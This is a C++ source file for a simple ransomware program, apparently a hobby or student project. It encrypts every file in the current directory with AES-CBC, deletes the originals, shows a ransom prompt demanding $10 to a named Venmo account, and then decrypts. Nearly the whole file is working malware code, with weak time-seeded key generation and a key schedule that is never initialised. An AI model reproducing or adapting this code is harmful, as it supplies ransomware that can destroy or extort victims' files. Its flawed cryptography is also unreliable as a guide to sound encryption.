#include <cstdio>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
//#include <tuchar.h>
#include "crypto-algorithms/aes.h"
#include "crypto-algorithms/aes.c"
#include <windows.h>
#include <string.h> 
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <dirent.h>
#include <direct.h>
#include <time.h>
//#pragma execution_unsigned character_set( "utf-8" );

unsigned char * CTXT_FROM_READ;
unsigned char * CTXT_ORIGINAL;
char * NAME_OF_PROGRAM = "ransomware.exe";

void get_file_names(char * path){ //dead function just reads file names
  DIR *dir; struct dirent *diread;
  if ((dir = opendir(path)) != nullptr){
    while((diread = readdir(dir)) != nullptr){
      printf("%s\n", diread->d_name);
    }
    closedir(dir); 
  }
}


unsigned char* read_file(char* path, long &ptlen){ //reads in data from filepath
  FILE *fileptr;
  long filelen;
  //printf("start of read file\nptlen: %ld\n",ptlen);
  fileptr = fopen(path, "rb");  // Open the file in binary mode
  fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
  //printf("made it past fseek\n");
  fflush(stdout);
  filelen = ftell(fileptr);             // Get the current byte offset in the file
  rewind(fileptr);                      // Jump back to the beginning of the file

  //printf("ptlen: %ld\nfilelen %ld\n", ptlen, filelen);
  fflush(stdout);
  unsigned char* buffer = (unsigned char*)calloc((filelen), sizeof(unsigned char)); // Enough memory for the file
  fread(buffer, filelen, 1, fileptr); // Read in the entire file
  fclose(fileptr); // Close the file
  ptlen = filelen;
  return buffer;
}

//create file
bool create_file_bin(char* path, unsigned char* data, long size){
  FILE *fileptr = fopen(path, "w+b");
  fwrite((uint8_t*)data, size, sizeof(uint8_t), fileptr);
  fclose(fileptr);
  return 1;
}

//takes in data and writes it to a new file
bool create_file_char(char* path, unsigned char* data, long size){
  FILE *fileptr = fopen(path, "w+");
  fwrite((uint8_t*)data, size, sizeof(uint8_t), fileptr);
  fclose(fileptr);
  return 1;
}

//delete file
bool delete_file(char* path){
  if(remove(path) != 0)
    return 0;
  return 1;
}

unsigned char* enc_file(char* path, WORDA * key_schedule, const BYTE iv[], long &lenPT){ //reads a file then decrypts the file
  unsigned char* plaintxt = read_file(path, lenPT);

  if (lenPT%AES_BLOCK_SIZE != 0){
    unsigned char * temp = (unsigned char*)calloc((lenPT + (AES_BLOCK_SIZE - lenPT%AES_BLOCK_SIZE)),sizeof(unsigned char));
    memcpy((void*)temp, (void*)plaintxt, lenPT);
    free(plaintxt);
    plaintxt = temp;
    lenPT += (AES_BLOCK_SIZE - lenPT%AES_BLOCK_SIZE);
  }
  unsigned char* buffer = (unsigned char *)calloc(lenPT, sizeof(unsigned char));

  aes_encrypt_cbc((BYTE *)plaintxt, lenPT, (BYTE *)buffer, key_schedule, 256, iv);
  return buffer;
}

//dec file
unsigned char* dec_file(char* path, WORDA * key_schedule, const BYTE iv[], long &lenPT){
  long encLen; 
  unsigned char* ciphertxt = read_file(path, encLen);
  //printf("filelen %ld\n", encLen); 
  unsigned char* plaintxt = (unsigned char*)calloc((encLen), sizeof(unsigned char));
  aes_decrypt_cbc((BYTE *)ciphertxt, encLen, (BYTE *)plaintxt, key_schedule, 256, iv);
  lenPT = encLen;
  return plaintxt; 
}

//enc dir
void enc_dir(char * path, WORDA * key_schedule, const BYTE iv[]){
  DIR *dir; struct dirent *diread;
  long len = 0; 
  if ((dir = opendir(path)) != nullptr){
    while((diread = readdir(dir)) != nullptr){
      //printf("%s\n%d %d %d\n", diread->d_name, strcmp(diread->d_name, NAME_OF_PROGRAM),strcmp(diread->d_name, "."),strcmp(diread->d_name, "..")     );


      if(strcmp(diread->d_name, NAME_OF_PROGRAM) != 0 && strcmp(diread->d_name, ".") != 0 && strcmp(diread->d_name, "..")!=0){
        len = 0;
        unsigned char * buffer = enc_file(diread->d_name, key_schedule, iv, len);
        delete_file(diread->d_name);
        create_file_bin(diread->d_name, buffer, (len * sizeof(unsigned char)));
        free(buffer);
      }
    }
    closedir(dir); 
  }
}

//dec dir
void dec_dir(char * path, WORDA * key_schedule, const BYTE iv[]){
  DIR *dir; struct dirent *diread;
  long len = 0; 
  if ((dir = opendir(path)) != nullptr){
    while((diread = readdir(dir)) != nullptr){
     // printf("%s\n%d %d %d\n", diread->d_name, strcmp(diread->d_name, NAME_OF_PROGRAM),strcmp(diread->d_name, "."),strcmp(diread->d_name, "..")     );
      if(strcmp(diread->d_name, NAME_OF_PROGRAM)!= 0 && strcmp(diread->d_name, ".")!=0 && strcmp(diread->d_name, "..") != 0  ){ 
        len = 0;
        unsigned char * buffer = dec_file(diread->d_name, key_schedule, iv, len);
        create_file_bin(diread->d_name, buffer, (len * sizeof(unsigned char)));
        free(buffer);
      }
    }
    closedir(dir); 
  }
}

//no idea why this loops
void randsom_note(){
  char c; 
  while(1){
    printf("Did you send 10 dollars to the venmo account (@Henry-Helstad)? (y/n)\n" );
    Sleep(10); 
    c =  getchar();

    if(c == 'y' || c == 'Y')
      return;
  }
}


//This key generation is not even remotely uniformly random
unsigned char* randGen(int size){
  unsigned char* buffer = (unsigned char*) malloc(size * sizeof(unsigned char));
  srand(time(NULL));
  for( int i = 0; i < size; i++){
    buffer[i] = rand() % 256;
  }
  return buffer; 
}


int main()
{
  //printf("\nbegining of setup...\n");
  //TEST ----------------------------------------------------------------------------------------------------
  //Hard coded the key and the IV needs to be changed
  WORDA key_schedule[60];

  //allocates space for key and generates a key
	int pass = 1;
  BYTE** key = (unsigned char **)calloc( 1, sizeof(unsigned char *));
  key[0] = (unsigned char*)calloc(32, sizeof(unsigned char)); 
  key[0] = randGen(32);

  BYTE** iv = (unsigned char **)calloc( 1, sizeof(unsigned char *));
  iv[0] = (unsigned char*)calloc(16, sizeof(unsigned char)); 
  iv[0] = randGen(16);
  char path[256];
  _getcwd(path, 256);
  enc_dir(path, key_schedule, iv[0]); 
  randsom_note();
  dec_dir(path, key_schedule, iv[0]);


   
  
 // Sleep(100000000);
  return 0; 
}
